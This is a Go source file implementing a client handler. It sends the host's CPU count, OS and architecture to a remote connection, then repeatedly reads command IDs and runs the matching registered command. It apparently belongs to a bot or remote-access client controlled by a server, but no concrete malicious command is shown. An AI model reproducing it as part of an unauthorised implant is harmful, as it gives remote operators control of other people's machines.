package client

import (
	"client/core/config"
	"client/core/modules/commands"
	"fmt"
	"runtime"
	"strconv"
	"time"
)

func handle(client config.Client) {
	defer client.Connection.Close()

	client.Write("\x03")
	time.Sleep(15 * time.Millisecond)
	client.Write(fmt.Sprint(runtime.NumCPU()))
	time.Sleep(15 * time.Millisecond)
	client.Write(runtime.GOOS)
	time.Sleep(15 * time.Millisecond)
	client.Write(runtime.GOARCH)
	time.Sleep(15 * time.Millisecond)

	for {
		idStr, err := client.Read(16)
		if err != nil {
			break
		}

		id, err := strconv.Atoi(idStr)
		if err != nil {
			continue
		}

		command := commands.Get(id)
		if command == nil {
			continue
		}

		err = command.Executor(client)
		if err != nil {
			fmt.Println(err)
			continue
		}
	}
}
